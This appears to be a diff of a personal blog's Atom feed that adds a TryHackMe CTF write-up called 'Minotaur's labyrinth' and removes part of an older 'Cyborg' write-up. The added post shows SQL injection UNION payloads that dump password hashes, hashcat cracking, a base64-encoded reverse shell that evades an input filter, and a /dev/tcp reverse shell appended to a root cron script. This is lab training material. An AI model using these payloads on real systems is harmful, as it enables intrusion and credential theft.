@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/tryhackme/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-10-26T07:52:25+00:00</updated>
+  <updated>2021-11-07T15:36:06+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/tryhackme/feed.xml</id>
 
   
@@ -30,6 +30,416 @@
   
   
 
+  
+    <entry>
+      <title type="html">Minotaur’s labyrinth Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/minotaurslabyrinth" rel="alternate" type="text/html" title="Minotaur's labyrinth Write Up" />
+      <published>2021-11-07T00:00:00+00:00</published>
+      <updated>2021-11-07T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/minotaurslabyrinth</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/minotaurslabyrinth">&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/labyrinth8llv&quot;&gt;Minotaur’s labyrinth&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/xenox&quot;&gt;xenox&lt;/a&gt; and &lt;a href=&quot;https://tryhackme.com/p/spayc&quot;&gt;spayc&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The Minotaur threw a fit and captured some people in the Labyrinth. Are you able to help Daedalus free them?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I started a nmap scan to check for available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# Nmap 7.91 scan initiated Sun Nov  7 12:41:10 2021 as: nmap -sC -sV -oA nmap/initial 10.10.68.118
+Nmap scan report for 10.10.68.118
+Host is up (0.044s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15 14:57 pub
+80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+| http-title: Login
+|_Requested resource was login.html
+443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+| http-title: Login
+|_Requested resource was login.html
+| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
+| Not valid before: 2004-10-01T09:10:30
+|_Not valid after:  2010-09-30T09:10:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, Help, Kerberos, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|_    Host 'ip-10-8-21-217.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.91%I=7%D=11/7%Time=6187C968%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.i
+SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
+SF:aDB\x20server&quot;)%r(GenericLines,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-2
+SF:1-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20c
+SF:onnect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,68,&quot;d\0\0\x01\
+SF:xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x2
+SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r
+SF:(RTSPRequest,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
+SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
+SF:is\x20MariaDB\x20server&quot;)%r(DNSVersionBindReqTCP,68,&quot;d\0\0\x01\xffj\x04
+SF:Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20
+SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSStat
+SF:usRequestTCP,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.
+SF:compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th
+SF:is\x20MariaDB\x20server&quot;)%r(Help,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8
+SF:-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x2
+SF:0connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(SSLSessionReq,68,&quot;d\0\0
+SF:\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20
+SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
+SF:r&quot;)%r(TerminalServerCookie,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-21
+SF:7\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conne
+SF:ct\x20to\x20this\x20MariaDB\x20server&quot;)%r(TLSSessionReq,68,&quot;d\0\0\x01\x
+SF:ffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20
+SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(
+SF:Kerberos,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10-8-21-217\.eu-west-1\.comp
+SF:ute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
+SF:20MariaDB\x20server&quot;)%r(SMBProgNeg,68,&quot;d\0\0\x01\xffj\x04Host\x20'ip-10
+SF:-8-21-217\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\
+SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;);
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Nov  7 12:41:26 2021 -- 1 IP address (1 host up) scanned in 16.38 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;4 ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;21 - FTP - ProFTPD&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache httpd 2.4.48&lt;/li&gt;
+  &lt;li&gt;443 - HTTPS - Apache httpd 2.4.48&lt;/li&gt;
+  &lt;li&gt;3306 - MYSQL - MariaDB server&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;FTP allows anonymous access so I started by looking for anything interesting in there.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.68.118                                                   
+Connected to 10.10.68.118.                                               
+220 ProFTPD Server (ProFTPD) [::ffff:10.10.68.118]                       
+Name (10.10.68.118:daz): anonymous                                       
+331 Anonymous login ok, send your complete email address as your password
+Password:
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
+226 Transfer complete
+ftp&amp;gt; cd pub
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
+-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
+226 Transfer complete
+ftp&amp;gt; get message.txt
+local: message.txt remote: message.txt
+200 PORT command successful
+150 Opening BINARY mode data connection for message.txt (141 bytes)
+226 Transfer complete
+141 bytes received in 0.00 secs (140.2193 kB/s)
+ftp&amp;gt; cd .secret
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
+226 Transfer complete
+ftp&amp;gt; cd pub
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
+drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
+drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
+-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
+226 Transfer complete
+ftp&amp;gt; get message.txt
+local: message.txt remote: message.txt
+200 PORT command successful
+150 Opening BINARY mode data connection for message.txt (141 bytes)
+226 Transfer complete
+141 bytes received in 0.00 secs (140.2193 kB/s)
+ftp&amp;gt; cd .secret
+250 CWD command successful
+ftp&amp;gt; ls -lah
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .
+drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 ..
+-rw-r--r--   1 root     root           30 Jun 15 19:49 flag.txt
+-rw-r--r--   1 root     root          114 Jun 15 14:56 keep_in_mind.txt
+226 Transfer complete
+ftp&amp;gt; get keep_in_mind.txt
+local: keep_in_mind.txt remote: keep_in_mind.txt
+200 PORT command successful
+150 Opening BINARY mode data connection for keep_in_mind.txt (114 bytes)
+226 Transfer complete
+114 bytes received in 0.01 secs (12.2017 kB/s)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Not much in there, I downloaded the message.txt and keep_in_mind.txt files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat message.txt keep_in_mind.txt 
+Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
+-- Minotaur
+Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
+-- Minotaur
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No credentials or anything that jumps out other than probably a cronjob being used somewhere that I should keep an eye out for. I turned my attention to the web ports and got a login prompt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried the normal admin/admin, admin/password etc but nothing worked. Its never going to be that easy to get root by I did click the link and just got a page with the two creators.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/roottroll.png&quot; alt=&quot;roottroll&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The forget password link was also a troll!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/passwdtroll.png&quot; alt=&quot;passwdtroll&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I had a look at the source but nothing jumped out expect a javascript file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/websource.png&quot; alt=&quot;websource&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great a username ‘Daedalus’! Also a basic password generating function.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loginjs.png&quot; alt=&quot;loginjs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Rather than doing manually, I put the function in to a python script and got the users password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat pwdgen.py 
+
+a = [&quot;0&quot;, &quot;h&quot;, &quot;?&quot;, &quot;1&quot;, &quot;v&quot;, &quot;4&quot;, &quot;r&quot;, &quot;l&quot;, &quot;0&quot;, &quot;g&quot;]
+b = [&quot;m&quot;, &quot;w&quot;, &quot;7&quot;, &quot;j&quot;, &quot;1&quot;, &quot;e&quot;, &quot;8&quot;, &quot;l&quot;, &quot;r&quot;, &quot;a&quot;, &quot;2&quot;]
+c = [&quot;c&quot;, &quot;k&quot;, &quot;h&quot;, &quot;p&quot;, &quot;q&quot;, &quot;9&quot;, &quot;w&quot;, &quot;v&quot;, &quot;5&quot;, &quot;p&quot;, &quot;4&quot;]
+
+print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried the username and generated password and was able to successfully login to the portal.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The webpage has a simple search feature, the table looks like database columns and with the NMAP showing a SQL database its safe to assume this search function will query the database.&lt;/p&gt;
+
+&lt;p&gt;I tested some basic queries and it appears the search function is vulnerable to SQLi. When I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; character I got an error ‘No callback’ however if I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;';-- -&lt;/code&gt; I don’t get an error which indicates I’m completing the SQL command by commenting out the rest of the query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlitest.gif&quot; alt=&quot;sqlitest&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Because of the output page at the bottom I assumed I could use UNION SELECT to get results from the database and display on the page. There are 3 columns on the page so I tried the UNION SELECT statement &lt;code class=&quot;highlighter-rouge&quot;&gt;' union select 1,2,3;-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlidatabase.gif&quot; alt=&quot;sqlidatabase&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So far so good! From the drop down is People &amp;amp; Creatures so rather enumerating for other tables I decided to look at at the columns for these tables with the command&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='people';-- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/tablecolumns.png&quot; alt=&quot;tablecolumns&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This provided the column names:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;idPeople&lt;/li&gt;
+  &lt;li&gt;namePeople&lt;/li&gt;
+  &lt;li&gt;passwordPeople&lt;/li&gt;
+  &lt;li&gt;permissionPeople&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now with the query &lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,namePeople,passwordPeople from people;-- -&lt;/code&gt; I could get a list of the names and passwords.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqluserlist.png&quot; alt=&quot;sqluserlist&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also wanted to see the permissions to each person so did another query to get this information, there is probably a way to use group concat to put all the information on one line but I just did a second query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/peoplepermission.png&quot; alt=&quot;peoplepermission&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;M!n0taur is an admin. I put all the names and password hashes in to a file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat peoplecreds 
+Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e
+Menekrates:0b3bebe266a81fbfaa79db1604c4e67f
+Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b
+Daedalus:b8e4c23686a3a12476ad7779e35f5eb6
+M!n0taur:1765db9457f496a39859209ee81fbda4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 0 peoplecreds /usr/share/wordlists/rockyou.txt --username&lt;/code&gt; I can use hashcat to crack the hashes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/crackedusers.png&quot; alt=&quot;crackedusers&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I logged out of the portal and back in with M!n0taur’s credentials and now had admin access.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/adminpage.png&quot; alt=&quot;adminpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A new link is presented ‘Secret Stuff’, navigating to this page give us another input box but this time echoing what ever we enter.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/echopage.png&quot; alt=&quot;echopage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I did some basic tests and using pipe &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; allowed me to get command injection. 
+&lt;img src=&quot;/assets/images/minotaurslabyrinth/echotest.gif&quot; alt=&quot;echotest&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;With the ability to run commands on the target I tried to get a reverseshell back to my machine, however none of my payloads worked and I got the following message.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/errormessage.png&quot; alt=&quot;errormessage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Because I could execute commands, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; and could see the echo.php page I was trying to exploit, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; to reach the source code and found a regex checking my input.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regex.gif&quot; alt=&quot;regex&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A good resource for testing regex is &lt;a href=&quot;https://regexr.com&quot;&gt;https://regexr.com&lt;/a&gt;, I put in the expression and could see a range of characters are being matched, all the reverse shell payloads were matching the expression.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regexcompare.png&quot; alt=&quot;regexcompare&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So so get around this, I encoded my payload as base64, another great resource is &lt;a href=&quot;https://www.revshells.com&quot;&gt;https://www.revshells.com&lt;/a&gt;. Put in your IP and port and you can pick the type of reverse shell you want and then encode it with base64.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/genshell.png&quot; alt=&quot;genshell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used the python3 payload, once thing to note is the regex will check for &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; so your payload must not need padding once encoded to base64.&lt;/p&gt;
+
+&lt;p&gt;Now with my payloaded encoded, I started a listener and on the echo page I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;base64 string&amp;gt; | base64 -d | bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 41916
+bash: /root/.bashrc: Permission denied
+daemon@labyrinth:/opt/lampp/htdocs$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I finally had a shell!&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;While enumerating the machine I found a folder called ‘reminders’ which is not a standard folder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/$ ls
+ls
+bin    home            lost+found  reminders  srv       usr
+boot   initrd.img      media       root       swapfile  var
+cdrom  initrd.img.old  mnt         run        sys       vmlinuz
+dev    lib             opt         sbin       timers    vmlinuz.old
+etc    lib64           proc        snap       tmp
+daemon@labyrinth:/$ cd reminders
+cd reminders
+daemon@labyrinth:/reminders$ ls -lah
+ls -lah
+total 44K
+drwxr-xr-x  2 root root 4,0K jún   15 17:25 .
+drwxr-xr-x 26 root root 4,0K szept 20 08:42 ..
+-rw-r--r--  1 root root  31K nov    7 14:36 dontforget.txt
+daemon@labyrinth:/reminders$ date
+date
+2021. nov. 7., vasárnap, 14:36:07 CET
+daemon@labyrinth:/reminders$ 
+daemon@labyrinth:/reminders$ tail dontforget.txt
+tail dontforget.txt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+dont fo...forge...ttt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The ‘dontforget.txt’ file is being regularly updated, thinking back at the text files from the FTP service there is probably a cron job running. Looking around the machine further I found a timers folder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/reminders$ cd /timers
+cd /timers
+daemon@labyrinth:/timers$ ls
+ls
+timer.sh
+daemon@labyrinth:/timers$ ls -lah timer.sh
+ls -lah timer.sh
+-rwxrwxrwx 1 root root 117 nov    7 14:38 timer.sh
+daemon@labyrinth:/timers$ cat timer.sh
+cat timer.sh
+#!/bin/bash
+echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
+daemon@labyrinth:/timers$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is the script adding entries to the text file in the reminders folder and we have full write access. So I appended another reverse shell now calling port 5555.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/timers$ echo '/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
+&amp;lt;h -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
+daemon@labyrinth:/timers$ cat timer.sh
+cat timer.sh
+#!/bin/bash
+echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
+/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Started a listener and waiting for the script to run and got a shell as root!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 5555
+listening on [any] 5555 ...
+connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 38120
+bash: cannot set terminal process group (6018): Inappropriate ioctl for device
+bash: no job control in this shell
+root@labyrinth:~# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="medium" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Couch Write Up</title>
@@ -2854,446 +3264,6 @@ echo &quot;&quot; &amp;gt; &quot;--checkpoint=1&quot;
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Now just wait for a minute and we now have a root shell!&lt;/p&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="easy" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Cyborg Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/cyborg" rel="alternate" type="text/html" title="Cyborg Write Up" />
-      <published>2021-01-30T00:00:00+00:00</published>
-      <updated>2021-01-30T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/cyborg</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/cyborg">&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/cover.png&quot; alt=&quot;cyborg&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/cyborgt8&quot;&gt;Cyborg&lt;/a&gt; is a easy room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.4.85. I started a NMAP scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.4.85
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-25 19:42 GMT
-Nmap scan report for 10.10.4.85
-Host is up (0.032s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
-|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
-|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;The webpage just presents a default apache page so I ran a gobuster.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.4.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.4.85
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/01/25 19:43:12 Starting gobuster
-===============================================================
-/admin (Status: 301)
-/etc (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2021/01/25 19:45:28 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/etc jumped out as I dont see that to often.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/cyborg/squid.png&quot; alt=&quot;squid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Two files are in /etc/squid, passwd and squid.conf, I downloaded each, looking at passwd shows:&lt;/p&gt;
-
-&lt;p&gt;music_archive:$apr1$B{REDACTED}&lt;/p&gt;
-
